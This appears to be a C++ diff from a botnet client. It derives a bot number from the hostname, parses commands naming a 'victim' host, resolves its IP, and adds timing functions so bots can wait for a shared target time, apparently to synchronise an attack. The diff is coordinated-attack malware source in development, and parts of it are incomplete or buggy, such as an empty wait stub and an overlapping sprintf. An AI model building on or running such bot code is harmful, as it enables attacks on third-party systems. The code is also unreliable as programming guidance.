@@ -44,12 +44,13 @@ void getOffset(){
   else cout << "Unable to open file"; 
 }
 
-int get_current_time(){
+sync_time_t get_current_time(){
     char cBuffer[100];
     time_t zaman;
     struct tm *ltime;
     static struct timeval _t;
     static struct timezone tz;
+    int secCnt = 0;
 
     time(&zaman);
     ltime = (struct tm *) localtime(&zaman);
@@ -58,6 +59,11 @@ int get_current_time(){
     strftime(cBuffer,40,"%d.%m.%y %H:%M:%S",ltime);
     sprintf(cBuffer, "%s.%d", cBuffer,(int)_t.tv_usec);
     printf("current time %s \n",cBuffer);
+
+    sync_time_t retval;
+    retval.sec= ltime->tm_hour * 3600 + ltime->tm_min * 60 + ltime->tm_sec;
+    retval.usec = (int)_t.tv_usec;
+    return retval;
 }
 int print_time(){
     get_current_time();
@@ -70,6 +76,11 @@ void getBotNo(){
     gethostname(hostname, 1023);
     cout << "Host name:" << hostname << endl;
     botNo = hostname[3] - 48;
+}
+void waitUntilTargettime(char* time){
+    sync_time_t now = get_current_time();
+    sync_time_t target;
+    cout << time << endl;
 }
 int main(void)
 {
@@ -136,6 +147,7 @@ void parseCommand(char command[])
         struct hostent *hostinfo = NULL; //Host name
         char victim_ip[256];
         cout << command << endl;
+        waitUntilTargettime(command+15);
         hostinfo = gethostbyname(victim);
         sprintf(victim_ip,"%s",inet_ntoa(*(struct in_addr *)*(hostinfo->h_addr_list)));
         cout << victim_ip << endl;
